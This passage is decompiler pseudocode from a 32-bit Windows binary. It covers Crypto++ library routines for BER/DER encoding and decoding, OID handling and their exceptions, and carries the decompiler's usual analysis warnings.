int __cdecl sub_40A95A(unsigned int *a1)
{
  unsigned int v1; // ecx
  unsigned int v2; // ebp
  bool v3; // zf
  int result; // eax
  unsigned int v5; // edi
  unsigned int v6; // esi
  unsigned int v7; // [esp+8h] [ebp+4h]

  v1 = a1[1];
  v2 = *a1;
  result = v1 | *a1;
  v3 = *(_QWORD *)a1 == 0i64;
  v7 = v1;
  if ( !v3 )
  {
    v5 = 0;
    v6 = 64;
    do
    {
      if ( __PAIR64__(v1, v2) >> ((v6 + v5) >> 1) )
        v5 = (v6 + v5) >> 1;
      else
        v6 = (v6 + v5) >> 1;
      v1 = v7;
    }
    while ( v6 - v5 > 8 );
    return v6 >> 3;
  }
  return result;
}

//----- (0040A9A7) --------------------------------------------------------
BOOL __cdecl sub_40A9A7(_DWORD *a1)
{
  return *a1 && ((*a1 - 1) & *a1) == 0;
}

//----- (0040A9BF) --------------------------------------------------------
int __cdecl sub_40A9BF(_DWORD *a1, _DWORD *a2)
{
  int v2; // ecx

  if ( *a2 <= 1u )
    v2 = 0;
  else
    v2 = *a2 - 1;
  return v2 & *a1;
}

//----- (0040A9DA) --------------------------------------------------------
int __cdecl sub_40A9DA(_DWORD *a1, _DWORD *a2)
{
  if ( sub_40A9A7(a2) )
    return *a1 - sub_40A9BF(a1, a2);
  else
    return *a1 - *a1 % *a2;
}

//----- (0040AA0F) --------------------------------------------------------
int __cdecl sub_40AA0F(_DWORD *a1, _DWORD *a2)
{
  int v3; // [esp+10h] [ebp-54h] BYREF
  int pExceptionObject[10]; // [esp+14h] [ebp-50h] BYREF
  _DWORD Src[10]; // [esp+3Ch] [ebp-28h] BYREF

  if ( (unsigned int)-*a2 < *a1 )
  {
    sub_40AAE3((int)Src, "RoundUpToMultipleOf: integer overflow");
    Src[9] = 0;
    sub_406307(pExceptionObject, 1, Src);
    pExceptionObject[0] = (int)&CryptoPP::InvalidArgument::`vftable';
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVInvalidArgument_CryptoPP__);
  }
  v3 = *a1 + *a2 - 1;
  return sub_40A9DA(&v3, a2);
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';

//----- (0040AA7B) --------------------------------------------------------
_QWORD *__cdecl sub_40AA7B(_QWORD *a1, _QWORD *a2)
{
  _QWORD *v2; // ecx

  v2 = a2;
  if ( *a2 >= *a1 )
    return a1;
  return v2;
}

//----- (0040AA98) --------------------------------------------------------
bool __cdecl sub_40AA98(int a1, int a2, _DWORD *a3)
{
  *a3 = a1;
  return a2 == 0;
}

//----- (0040AAC1) --------------------------------------------------------
int __cdecl sub_40AAC1(void *Src, int a2, void *a3)
{
  memmove(a3, Src, a2 - (_DWORD)Src);
  return (int)a3 + a2 - (_DWORD)Src;
}

//----- (0040AAE3) --------------------------------------------------------
int __thiscall sub_40AAE3(int this, char *Src)
{
  unsigned int v3; // eax
  int v4; // edx

  *(_DWORD *)(this + 16) = 0;
  *(_DWORD *)(this + 20) = 15;
  *(_BYTE *)this = 0;
  v3 = sub_40BC7D(Src);
  sub_40BC05((void **)this, v4, Src, v3);
  return this;
}
// 40AB05: variable 'v4' is possibly undefined

//----- (0040AB10) --------------------------------------------------------
std::exception *__thiscall sub_40AB10(std::exception *this, struct std::exception *a2)
{
  sub_40663E(this, a2);
  *(_DWORD *)this = &CryptoPP::BERDecodeErr::`vftable';
  return this;
}
// 46B47C: using guessed type void *CryptoPP::BERDecodeErr::`vftable';

//----- (0040AB31) --------------------------------------------------------
_DWORD *__thiscall sub_40AB31(_DWORD *this)
{
  _DWORD Src[10]; // [esp+14h] [ebp-28h] BYREF

  sub_40AAE3((int)Src, "BER decode error");
  Src[9] = 0;
  sub_406307(this, 1, Src);
  *this = &CryptoPP::InvalidArgument::`vftable';
  sub_40BAFC(Src, 1, 0);
  *this = &CryptoPP::BERDecodeErr::`vftable';
  return this;
}
// 46B464: using guessed type void *CryptoPP::InvalidArgument::`vftable';
// 46B47C: using guessed type void *CryptoPP::BERDecodeErr::`vftable';

//----- (0040AB80) --------------------------------------------------------
_DWORD *__thiscall sub_40AB80(_DWORD *this, int a2, char a3)
{
  sub_40CAC3(this, 0);
  this[3] = -1;
  *((_BYTE *)this + 16) = 0;
  *this = &CryptoPP::BERGeneralDecoder::`vftable';
  this[1] = &CryptoPP::BERGeneralDecoder::`vftable';
  this[5] = a2;
  *((_BYTE *)this + 24) = 0;
  sub_40B646((int)this, a3);
  return this;
}
// 46B59C: using guessed type void *CryptoPP::BERGeneralDecoder::`vftable';
// 46B654: using guessed type void *CryptoPP::BERGeneralDecoder::`vftable';

//----- (0040ABBB) --------------------------------------------------------
int __thiscall sub_40ABBB(int this, int a2, char a3)
{
  int result; // eax

  sub_424BAD((_DWORD *)this, 0);
  *(_DWORD *)(this + 40) = a2;
  *(_BYTE *)(this + 45) = a3;
  result = this;
  *(_DWORD *)this = &CryptoPP::DERGeneralEncoder::`vftable';
  *(_DWORD *)(this + 4) = &CryptoPP::DERGeneralEncoder::`vftable';
  *(_BYTE *)(this + 44) = 0;
  return result;
}
// 46B664: using guessed type void *CryptoPP::DERGeneralEncoder::`vftable';
// 46B718: using guessed type void *CryptoPP::DERGeneralEncoder::`vftable';

//----- (0040ABF2) --------------------------------------------------------
_DWORD *__thiscall sub_40ABF2(_DWORD *this, int a2)
{
  *this = &CryptoPP::OID::`vftable';
  this[1] = 0;
  this[2] = 0;
  this[3] = 0;
  sub_40AE24(this, a2);
  return this;
}
// 46B594: using guessed type void *CryptoPP::OID::`vftable';

//----- (0040AC29) --------------------------------------------------------
_DWORD *__thiscall sub_40AC29(_DWORD *this, int a2)
{
  int (__thiscall ***v4)(void *, char); // [esp-8h] [ebp-10h]

  sub_40CAC3(this, 0);
  v4 = off_48C01C;
  *this = &CryptoPP::ByteQueue::Walker::`vftable';
  this[1] = &CryptoPP::ByteQueue::Walker::`vftable';
  this[3] = a2;
  this[4] = 0;
  this[6] = 0;
  this[7] = 0;
  this[8] = 0;
  this[9] = 0;
  this[10] = 0;
  sub_40D65E(this, (int)v4, -1);
  return this;
}
// 46B4D0: using guessed type void *CryptoPP::ByteQueue::Walker::`vftable';
// 46B584: using guessed type void *CryptoPP::ByteQueue::Walker::`vftable';
// 48C01C: using guessed type int (__thiscall ***off_48C01C)(void *Block, char);

//----- (0040AC76) --------------------------------------------------------
int __thiscall sub_40AC76(_BYTE *this)
{
  bool v1; // zf
  int result; // eax
  _DWORD v3[8]; // [esp+0h] [ebp-20h] BYREF

  v3[4] = v3;
  v3[7] = 0;
  v1 = this[24] == 0;
  *(_DWORD *)this = &CryptoPP::BERGeneralDecoder::`vftable';
  *((_DWORD *)this + 1) = &CryptoPP::BERGeneralDecoder::`vftable';
  if ( v1 )
    return sub_40B6AF((int)this);
  return result;
}
// 46B59C: using guessed type void *CryptoPP::BERGeneralDecoder::`vftable';
// 46B654: using guessed type void *CryptoPP::BERGeneralDecoder::`vftable';

//----- (0040ACD8) --------------------------------------------------------
void __thiscall sub_40ACD8(int this)
{
  bool v2; // zf
  _DWORD v3[6]; // [esp+0h] [ebp-24h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  v3[5] = v3;
  v3[4] = this;
  *(_DWORD *)this = &CryptoPP::DERGeneralEncoder::`vftable';
  *(_DWORD *)(this + 4) = &CryptoPP::DERGeneralEncoder::`vftable';
  v4 = 0;
  v2 = *(_BYTE *)(this + 44) == 0;
  LOBYTE(v4) = 1;
  if ( v2 )
    sub_40B6EB(this);
  sub_424C9A((_DWORD *)this);
}
// 46B664: using guessed type void *CryptoPP::DERGeneralEncoder::`vftable';
// 46B718: using guessed type void *CryptoPP::DERGeneralEncoder::`vftable';

//----- (0040AD5E) --------------------------------------------------------
_BYTE *__thiscall sub_40AD5E(char *this, char a2)
{
  return sub_40AD95(this - 4, a2);
}

//----- (0040AD66) --------------------------------------------------------
void *__thiscall sub_40AD66(char *this, char a2)
{
  return sub_40ADB4(this - 4, a2);
}

//----- (0040AD6E) --------------------------------------------------------
void *__thiscall sub_40AD6E(char *this, char a2)
{
  return sub_40ADFB(this - 4, a2);
}

//----- (0040AD76) --------------------------------------------------------
_DWORD *__thiscall sub_40AD76(_DWORD *Block, char a2)
{
  sub_4062E4(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0040AD95) --------------------------------------------------------
_BYTE *__thiscall sub_40AD95(_BYTE *Block, char a2)
{
  sub_40AC76(Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0040ADB4) --------------------------------------------------------
void *__thiscall sub_40ADB4(void *Block, char a2)
{
  sub_40ACD8((int)Block);
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0040ADD3) --------------------------------------------------------
_DWORD *__thiscall sub_40ADD3(_DWORD *Block, char a2)
{
  *Block = &CryptoPP::OID::`vftable';
  sub_40BB4F((int)(Block + 1));
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}
// 46B594: using guessed type void *CryptoPP::OID::`vftable';

//----- (0040ADFB) --------------------------------------------------------
void *__thiscall sub_40ADFB(void *Block, char a2)
{
  if ( (a2 & 1) != 0 )
    sub_42CF7C(Block);
  return Block;
}

//----- (0040AE15) --------------------------------------------------------
bool __thiscall sub_40AE15(_DWORD *this)
{
  return !sub_42501F(this);
}

//----- (0040AE24) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
unsigned int __thiscall sub_40AE24(_DWORD *this, int a2)
{
  int v2; // esi
  unsigned int v4; // edi
  unsigned int result; // eax
  unsigned int i; // edi
  unsigned int v7; // ebx
  int v8; // [esp-8h] [ebp-14h]
  int v9; // [esp-4h] [ebp-10h]
  unsigned int v10; // [esp+8h] [ebp-4h] BYREF

  v2 = a2;
  if ( !(*(int (__thiscall **)(int, int *))(*(_DWORD *)a2 + 72))(a2, &a2) || (_BYTE)a2 != 6 )
    ((void (__noreturn *)(void))sub_40B054)();
  if ( !sub_40B0B9(v2, &v10) || (v4 = v10) == 0 || !(*(int (__thiscall **)(int, int *))(*(_DWORD *)v2 + 72))(v2, &a2) )
    ((void (__noreturn *)(void))sub_40B054)();
  sub_40BD11(this + 1, 2u);
  *(_DWORD *)this[1] = (unsigned __int8)a2 / 0x28u;
  result = this[1];
  *(_DWORD *)(result + 4) = (unsigned __int8)a2 % 0x28u;
  for ( i = v4 - 1; i; i -= v7 )
  {
    v7 = sub_40B537(v2, &v10);
    if ( v7 > i )
      sub_40B054(v8, v9);
    result = sub_40BC96(this + 1, &v10);
  }
  return result;
}
// 40AED3: bad sp value at call
// 40AED8: variable 'v8' is possibly undefined
// 40AED8: variable 'v9' is possibly undefined
// 40B054: using guessed type void __stdcall __noreturn sub_40B054(_DWORD, _DWORD);

//----- (0040AEE3) --------------------------------------------------------
// bad sp value at call has been detected, the output may be wrong!
int __thiscall sub_40AEE3(int *this, int a2)
{
  int v3; // eax
  void *v4; // eax
  void **v6; // [esp+10h] [ebp-20h] BYREF
  char v7[12]; // [esp+14h] [ebp-1Ch] BYREF
  int v8; // [esp+20h] [ebp-10h]
  int v9; // [esp+2Ch] [ebp-4h]
  _DWORD v10[10]; // [esp+30h] [ebp+0h] BYREF
  int v11[10]; // [esp+58h] [ebp+28h] BYREF
  int v12[10]; // [esp+80h] [ebp+50h] BYREF

  sub_40AB80(v11, a2, 48);
  v11[0] = (int)&CryptoPP::BERSequenceDecoder::`vftable';
  v11[1] = (int)&CryptoPP::BERSequenceDecoder::`vftable';
  v9 = 0;
  sub_40AB80(v12, (int)v11, 48);
  v12[0] = (int)&CryptoPP::BERSequenceDecoder::`vftable';
  v12[1] = (int)&CryptoPP::BERSequenceDecoder::`vftable';
  v3 = *this;
  LOBYTE(v9) = 1;
  v4 = (void *)(*(int (__thiscall **)(int *, void ***))(v3 + 16))(this, &v6);
  LOBYTE(v9) = 2;
  sub_40B008(v4, (int)v12);
  LOBYTE(v9) = 1;
  v6 = &CryptoPP::OID::`vftable';
  sub_40BB4F((int)v7);
  if ( sub_40B607((int)v12) )
    LOBYTE(v8) = 0;
  else
    LOBYTE(v8) = (*(int (__thiscall **)(int *, int *))(*this + 20))(this, v12);
  sub_40B6AF((int)v12);
  sub_40AB80(v10, (int)v11, 3);
  LOBYTE(v9) = 3;
  sub_40B1AB(0);
  (*(void (__thiscall **)(int *, _DWORD *, int, _DWORD))(*this + 28))(this, v10, v8, v10[8]);
  sub_40B6AF((int)v10);
  sub_40B6AF((int)v11);
  sub_40AC76(v10);
  sub_40AC76(v12);
  return sub_40AC76(v11);
}
// 40AFC4: bad sp value at call
// 40AFCC: bad sp value at call
// 40AFD4: bad sp value at call
// 40AFDC: bad sp value at call
// 40AFE4: bad sp value at call
// 40B1AB: using guessed type _DWORD __stdcall sub_40B1AB(char);
// 46B594: using guessed type void *CryptoPP::OID::`vftable';
// 46B728: using guessed type void *CryptoPP::BERSequenceDecoder::`vftable';
// 46B7E0: using guessed type void *CryptoPP::BERSequenceDecoder::`vftable';
// 40AEE3: using guessed type char var_98[12];

//----- (0040B008) --------------------------------------------------------
int __thiscall sub_40B008(void *this, int a2)
{
  int v4; // [esp+0h] [ebp-2Ch]
  int v5; // [esp+4h] [ebp-28h]
  void **v6; // [esp+10h] [ebp-1Ch] BYREF
  char v7[20]; // [esp+14h] [ebp-18h] BYREF
  int v8; // [esp+28h] [ebp-4h]

  sub_40ABF2(&v6, a2);
  v8 = 0;
  if ( !sub_40A8EA((int)this + 4, (int)v7) )
    sub_40B054(v4, v5);
  v6 = &CryptoPP::OID::`vftable';
  return sub_40BB4F((int)v7);
}
// 40B038: variable 'v4' is possibly undefined
// 40B038: variable 'v5' is possibly undefined
// 40B054: using guessed type void __stdcall __noreturn sub_40B054(_DWORD, _DWORD);
// 46B594: using guessed type void *CryptoPP::OID::`vftable';

//----- (0040B054) --------------------------------------------------------
void __noreturn sub_40B054()
{
  _DWORD pExceptionObject[10]; // [esp+0h] [ebp-2Ch] BYREF

  sub_40AB31(pExceptionObject);
  _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI4_AVBERDecodeErr_CryptoPP__);
}
// 40B054: using guessed type void __noreturn sub_40B054();
// 40B054: using guessed type _DWORD pExceptionObject[10];

//----- (0040B07B) --------------------------------------------------------
char __cdecl sub_40B07B(int a1)
{
  int v1; // esi
  char result; // al
  int v3; // [esp+4h] [ebp-4h] BYREF

  v1 = a1;
  if ( !(*(int (__thiscall **)(int, char *))(*(_DWORD *)a1 + 72))(a1, (char *)&a1 + 3)
    || HIBYTE(a1) != 5
    || (result = sub_40B0B9(v1, &v3)) == 0
    || v3 )
  {
    sub_40B054();
  }
  return result;
}
// 40B054: using guessed type void __noreturn sub_40B054(void);

//----- (0040B0B9) --------------------------------------------------------
char __cdecl sub_40B0B9(int a1, _DWORD *a2)
{
  __int64 v3; // [esp+0h] [ebp-Ch] BYREF
  char v4; // [esp+Bh] [ebp-1h] BYREF

  v4 = 0;
  v3 = 0i64;
  if ( !sub_40B104(a1, (int *)&v3, &v4) || !sub_40AA98(v3, SHIDWORD(v3), a2) )
    sub_40B054();
  return v4;
}
// 40B054: using guessed type void __noreturn sub_40B054(void);

//----- (0040B104) --------------------------------------------------------
char __cdecl sub_40B104(int a1, int *a2, _BYTE *a3)
{
  int v3; // ebp
  unsigned __int8 v5; // cl
  int v6; // ebx
  int *v7; // edi
  int v8; // ecx

  v3 = a1;
  if ( !(*(int (__thiscall **)(int, int *))(*(_DWORD *)a1 + 72))(a1, &a1) )
    return 0;
  v5 = a1;
  if ( (a1 & 0x80u) == 0 )
  {
    *a3 = 1;
    *(_QWORD *)a2 = v5;
    return 1;
  }
  v6 = a1 & 0x7F;
  if ( (a1 & 0x7F) == 0 )
  {
    *a3 = v6;
    return 1;
  }
  v7 = a2;
  *a3 = 1;
  *v7 = 0;
  v7[1] = 0;
  while ( 1 )
  {
    --v6;
    if ( (unsigned int)v7[1] >= 0x1000000 )
      sub_40B054();
    if ( !(*(int (__thiscall **)(int, int *))(*(_DWORD *)v3 + 72))(v3, &a1) )
      break;
    v8 = (unsigned __int8)a1 | (*v7 << 8);
    v7[1] = *(_QWORD *)v7 >> 24;
    *v7 = v8;
    if ( !v6 )
      return 1;
  }
  return 0;
}
// 40B054: using guessed type void __noreturn sub_40B054(void);

//----- (0040B1AB) --------------------------------------------------------
#error "40B1CA: call analysis failed (funcsize=16)"

//----- (0040B1D0) --------------------------------------------------------
int __thiscall sub_40B1D0(int this, int a2, int a3, __int64 a4, int a5, int a6)
{
  int *v7; // eax
  int v8; // edx
  int v9; // edi

  if ( *(_BYTE *)(this + 25) )
  {
    v7 = (int *)sub_40AA7B((_QWORD *)(this + 32), &a4);
    v8 = *v7;
    LODWORD(a4) = *v7;
    v9 = v7[1];
    HIDWORD(a4) = v9;
  }
  else
  {
    v9 = HIDWORD(a4);
    v8 = a4;
  }
  return (*(int (__thiscall **)(_DWORD, int, int, int, int, int, int))(**(_DWORD **)(this + 20) + 128))(
           *(_DWORD *)(this + 20),
           a2,
           a3,
           v8,
           v9,
           a5,
           a6);
}

//----- (0040B21E) --------------------------------------------------------
__int64 __thiscall sub_40B21E(void *this, int a2, __int64 a3, __int64 a4, int a5)
{
  __int64 v6; // [esp+Ch] [ebp-8h] BYREF

  v6 = a3;
  (*(void (__thiscall **)(void *, int, __int64 *, _DWORD, _DWORD, int, int))(*(_DWORD *)this + 128))(
    this,
    a2,
    &v6,
    a4 + a3,
    (unsigned __int64)(a4 + a3) >> 32,
    a5,
    1);
  return v6 - a3;
}

//----- (0040B269) --------------------------------------------------------
void __thiscall sub_40B269(_DWORD *this, int *a2)
{
  _BYTE *v3; // ecx
  char v4; // al
  unsigned int i; // esi
  int v6; // eax
  __int64 v7; // rax
  int v8[2]; // [esp+10h] [ebp-44h] BYREF
  char v9[4]; // [esp+18h] [ebp-3Ch] BYREF
  int v10[14]; // [esp+1Ch] [ebp-38h] BYREF

  sub_424BAD(v10, 0);
  v3 = (_BYTE *)this[1];
  v4 = 40 * *v3;
  v10[13] = 0;
  v9[0] = v3[4] + v4;
  (*(void (__thiscall **)(int *, char *, int, _DWORD, int))(v10[0] + 20))(v10, v9, 1, 0, 1);
  for ( i = 2; i < (this[2] - this[1]) >> 2; ++i )
    sub_40B586(v10, *(_DWORD *)(this[1] + 4 * i));
  v6 = *a2;
  v9[0] = 6;
  (*(void (__thiscall **)(int *, char *, int, _DWORD, int))(v6 + 20))(a2, v9, 1, 0, 1);
  v7 = sub_424EC6(v10);
  sub_40B487(a2, v7);
  v8[0] = -1;
  v8[1] = -1;
  (*(void (__thiscall **)(int *, int *, int *, _DWORD *, int))(v10[0] + 124))(v10, a2, v8, dword_48C004, 1);
  sub_424C9A(v10);
}
// 48C004: using guessed type _DWORD dword_48C004[6];
// 40B269: using guessed type char var_3C[4];

//----- (0040B32D) --------------------------------------------------------
void __thiscall sub_40B32D(int *this, int a2)
{
  int v3; // eax
  _DWORD *v4; // eax
  void **v5; // [esp+10h] [ebp-20h] BYREF
  char v6[12]; // [esp+14h] [ebp-1Ch] BYREF
  char v7[4]; // [esp+20h] [ebp-10h] BYREF
  int v8; // [esp+2Ch] [ebp-4h]
  int v9[12]; // [esp+30h] [ebp+0h] BYREF
  int v10[12]; // [esp+60h] [ebp+30h] BYREF
  int v11[12]; // [esp+90h] [ebp+60h] BYREF

  sub_40ABBB((int)v10, a2, 48);
  v10[0] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v10[1] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v8 = 0;
  sub_40ABBB((int)v11, (int)v10, 48);
  v11[0] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v11[1] = (int)&CryptoPP::DERSequenceEncoder::`vftable';
  v3 = *this;
  LOBYTE(v8) = 1;
  v4 = (_DWORD *)(*(int (__thiscall **)(int *, void ***))(v3 + 16))(this, &v5);
  LOBYTE(v8) = 2;
  sub_40B269(v4, v11);
  LOBYTE(v8) = 1;
  v5 = &CryptoPP::OID::`vftable';
  sub_40BB4F((int)v6);
  (*(void (__thiscall **)(int *, int *))(*this + 24))(this, v11);
  sub_40B6EB((int)v11);
  sub_40ABBB((int)v9, (int)v10, 3);
  LOBYTE(v8) = 3;
  v7[0] = 0;
  (*(void (__thiscall **)(int *, char *, int, _DWORD, int))(v9[0] + 20))(v9, v7, 1, 0, 1);
  (*(void (__thiscall **)(int *, int *))(*this + 32))(this, v9);
  sub_40B6EB((int)v9);
  sub_40B6EB((int)v10);
  sub_40ACD8((int)v9);
  sub_40ACD8((int)v11);
  sub_40ACD8((int)v10);
}
// 46B594: using guessed type void *CryptoPP::OID::`vftable';
// 46B7F0: using guessed type void *CryptoPP::DERSequenceEncoder::`vftable';
// 46B8A4: using guessed type void *CryptoPP::DERSequenceEncoder::`vftable';
// 40B32D: using guessed type char var_B0[12];
// 40B32D: using guessed type char var_A4[4];

//----- (0040B450) --------------------------------------------------------
int __cdecl sub_40B450(int *a1)
{
  int *v1; // esi
  int v2; // eax
  int v3; // eax
  char v5[4]; // [esp+4h] [ebp-4h] BYREF

  v1 = a1;
  v2 = *a1;
  v5[0] = 5;
  (*(void (__thiscall **)(int *, char *, int, _DWORD, int))(v2 + 20))(a1, v5, 1, 0, 1);
  v3 = *v1;
  LOBYTE(a1) = 0;
  return (*(int (__thiscall **)(int *, int **, int, _DWORD, int))(v3 + 20))(v1, &a1, 1, 0, 1);
}
// 40B450: using guessed type char var_4[4];

//----- (0040B487) --------------------------------------------------------
int __cdecl sub_40B487(int *a1, unsigned __int64 a2)
{
  int v2; // edi
  int v3; // ebx
  int v4; // edi
  int v5; // edx
  char v7[8]; // [esp+18h] [ebp-Ch] BYREF
  int v8; // [esp+20h] [ebp-4h]

  if ( a2 > 0x7F )
  {
    v3 = sub_40A95A((unsigned int *)&a2);
    v7[0] = v3 | 0x80;
    (*(void (__thiscall **)(int *, char *, int, _DWORD, int))(*a1 + 20))(a1, v7, 1, 0, 1);
    v2 = 1;
    if ( v3 )
    {
      v8 = v3 + 1;
      v4 = 8 * v3 - 8;
      do
      {
        v5 = *a1;
        v7[0] = a2 >> v4;
        (*(void (__thiscall **)(int *, char *, int, _DWORD, int))(v5 + 20))(a1, v7, 1, 0, 1);
        v4 -= 8;
        --v3;
      }
      while ( v3 );
      return v8;
    }
  }
  else
  {
    (*(void (__thiscall **)(int *, unsigned __int64 *, int, _DWORD, int))(*a1 + 20))(a1, &a2, 1, 0, 1);
    return 1;
  }
  return v2;
}

//----- (0040B537) --------------------------------------------------------
int __cdecl sub_40B537(int a1, _DWORD *a2)
{
  _DWORD *v2; // ebx
  int v3; // esi
  char v4; // cl

  v2 = a2;
  v3 = 0;
  *a2 = 0;
  do
  {
    if ( !(*(int (__thiscall **)(int, char *))(*(_DWORD *)a1 + 72))(a1, (char *)&a2 + 3) || (++v3, *v2 >= 0x2000000u) )
      sub_40B054();
    v4 = HIBYTE(a2);
    *v2 = (*v2 << 7) + (HIBYTE(a2) & 0x7F);
  }
  while ( v4 < 0 );
  return v3;
}
// 40B054: using guessed type void __noreturn sub_40B054(void);

//----- (0040B586) --------------------------------------------------------
int __cdecl sub_40B586(int *a1, unsigned int a2)
{
  unsigned int *v2; // ecx
  int v3; // eax
  int v4; // edi
  unsigned int v5; // ebx
  int v6; // eax
  int v8; // [esp+Ch] [ebp-Ch] BYREF
  unsigned int v9; // [esp+10h] [ebp-8h] BYREF
  int v10; // [esp+14h] [ebp-4h] BYREF

  v10 = 7;
  v9 = sub_40A926(&a2);
  v8 = 7;
  v2 = &v9;
  if ( v9 <= 7 )
    v2 = (unsigned int *)&v8;
  v3 = sub_40AA0F(v2, &v10);
  v4 = v3 - 7;
  v5 = a2;
  if ( v3 != 7 )
  {
    do
    {
      LOBYTE(a2) = (v5 >> v4) | 0x80;
      (*(void (__thiscall **)(int *, unsigned int *, int, _DWORD, int))(*a1 + 20))(a1, &a2, 1, 0, 1);
      v4 -= 7;
    }
    while ( v4 );
  }
  v6 = *a1;
  LOBYTE(a2) = v5 & 0x7F;
  return (*(int (__thiscall **)(int *, unsigned int *, int, _DWORD, int))(v6 + 20))(a1, &a2, 1, 0, 1);
}

//----- (0040B607) --------------------------------------------------------
char __thiscall sub_40B607(int this)
{
  int v1; // eax
  char v2; // bl
  int v4; // [esp+0h] [ebp-4h] BYREF

  v4 = this;
  if ( *(_BYTE *)(this + 25) )
  {
    if ( *(_QWORD *)(this + 32) )
      LOBYTE(v1) = 0;
    else
      return (*(_DWORD *)(this + 36) | *(_DWORD *)(this + 32)) + 1;
  }
  else
  {
    v2 = 1;
    if ( sub_40D842(*(int **)(this + 20), &v4, 1) != 2 || (_WORD)v4 )
      v2 = 0;
    LOBYTE(v1) = v2;
  }
  return v1;
}

//----- (0040B646) --------------------------------------------------------
char __thiscall sub_40B646(int this, char a2)
{
  char result; // al
  char v4; // [esp+Bh] [ebp-1h] BYREF

  if ( !(*(int (__thiscall **)(_DWORD, char *))(**(_DWORD **)(this + 20) + 72))(*(_DWORD *)(this + 20), &v4)
    || v4 != a2
    || (result = sub_40B104(*(_DWORD *)(this + 20), (int *)(this + 32), (_BYTE *)(this + 25))) == 0
    || !*(_BYTE *)(this + 25) && (a2 & 0x20) == 0 )
  {
    sub_40B054();
  }
  return result;
}
// 40B054: using guessed type void __noreturn sub_40B054(void);

//----- (0040B69C) --------------------------------------------------------
__int64 __thiscall sub_40B69C(int this)
{
  return sub_424EC6((_DWORD *)*(_DWORD *)(this + 12)) - *(_QWORD *)(this + 24);
}

//----- (0040B6AF) --------------------------------------------------------
int __thiscall sub_40B6AF(int this)
{
  bool v1; // zf
  int result; // eax
  int v3; // [esp+0h] [ebp-4h] BYREF

  v3 = this;
  v1 = *(_BYTE *)(this + 25) == 0;
  *(_BYTE *)(this + 24) = 1;
  if ( v1 )
  {
    result = sub_40D5FB(*(int **)(this + 20), &v3, 1);
    if ( result != 2 )
      goto LABEL_8;
    v1 = (_WORD)v3 == 0;
  }
  else
  {
    result = *(_DWORD *)(this + 36) | *(_DWORD *)(this + 32);
    v1 = *(_QWORD *)(this + 32) == 0i64;
  }
  if ( !v1 )
LABEL_8:
    sub_40B054();
  return result;
}
// 40B054: using guessed type void __noreturn sub_40B054(void);

//----- (0040B6EB) --------------------------------------------------------
int __thiscall sub_40B6EB(int this)
{
  __int64 v2; // rax
  int v3; // ecx
  unsigned int v4; // ebp
  unsigned int v5; // edi
  int *v6; // esi
  int v7; // eax
  char v9[4]; // [esp+10h] [ebp-Ch] BYREF
  int v10[2]; // [esp+14h] [ebp-8h] BYREF

  v10[0] = this;
  *(_BYTE *)(this + 44) = 1;
  v2 = sub_424EC6((_DWORD *)this);
  v3 = *(_DWORD *)(this + 40);
  v4 = v2;
  v9[0] = *(_BYTE *)(this + 45);
  v5 = HIDWORD(v2);
  (*(void (__thiscall **)(int, char *, int, _DWORD, int))(*(_DWORD *)v3 + 20))(v3, v9, 1, 0, 1);
  v6 = (int *)v10[0];
  sub_40B487(*(int **)(v10[0] + 40), __PAIR64__(v5, v4));
  v7 = *v6;
  v10[0] = -1;
  v10[1] = -1;
  return (*(int (__thiscall **)(int *, int, int *, _DWORD *, int))(v7 + 124))(v6, v6[10], v10, dword_48C004, 1);
}
// 48C004: using guessed type _DWORD dword_48C004[6];
// 40B6EB: using guessed type char var_C[4];

//----- (0040B758) --------------------------------------------------------
#error "40B789: call analysis failed (funcsize=19)"

//----- (0040B78F) --------------------------------------------------------
int __thiscall sub_40B78F(int this, int a2, unsigned int *a3, int a4, int a5)
{
  unsigned int v6; // ecx
  unsigned int v7; // eax
  int v8; // esi

  if ( *(_BYTE *)(this + 25) )
  {
    v6 = *(_DWORD *)(this + 36);
    v7 = *(_DWORD *)(this + 32);
    if ( *(_QWORD *)a3 > __PAIR64__(v6, v7) )
    {
      *a3 = v7;
      a3[1] = v6;
    }
  }
  v8 = (*(int (__thiscall **)(_DWORD, int, unsigned int *, int, int))(**(_DWORD **)(this + 20) + 124))(
         *(_DWORD *)(this + 20),
         a2,
         a3,
         a4,
         a5);
  sub_40B758(*a3, a3[1]);
  return v8;
}
// 40B758: using guessed type _DWORD __stdcall sub_40B758(_DWORD, _DWORD);

//----- (0040B7DF) --------------------------------------------------------
_DWORD *__cdecl sub_40B7DF(unsigned int a1, unsigned int a2, char a3)
{
  _DWORD *result; // eax
  size_t v4; // ecx
  void *v5; // eax
  void *v6; // ecx

  if ( !a1 )
    return 0;
  if ( 0xFFFFFFFF / a2 < a1 )
LABEL_4:
    sub_4296F3();
  v4 = a2 * a1;
  if ( a3 && v4 >= 0x1000 )
  {
    if ( v4 + 35 <= v4 )
      goto LABEL_4;
    v5 = operator new(v4 + 35);
    v6 = v5;
    if ( !v5 )
LABEL_9:
      _invalid_parameter_noinfo_noreturn();
    result = (_DWORD *)(((unsigned int)v5 + 35) & 0xFFFFFFE0);
    *(result - 1) = v6;
  }
  else
  {
    result = operator new(v4);
    if ( !result )
      goto LABEL_9;
  }
  return result;
}
// 4296F3: using guessed type void __noreturn sub_4296F3(void);

//----- (0040B83F) --------------------------------------------------------
unsigned int __thiscall sub_40B83F(_DWORD *this, unsigned int a2)
{
  unsigned int result; // eax

  result = this[4];
  if ( result < a2 )
    sub_429730("invalid string position");
  return result;
}

//----- (0040B856) --------------------------------------------------------
void __thiscall sub_40B856(const void **this, int a2, size_t Size)
{
  const void **v3; // esi
  unsigned int v4; // edi
  unsigned int v5; // ebx
  unsigned int v6; // ecx
  _DWORD *v7; // eax
  const void **v8; // ecx
  bool v9; // cf
  _DWORD *v10; // [esp+14h] [ebp-14h]

  v3 = this;
  v4 = a2 | 0xF;
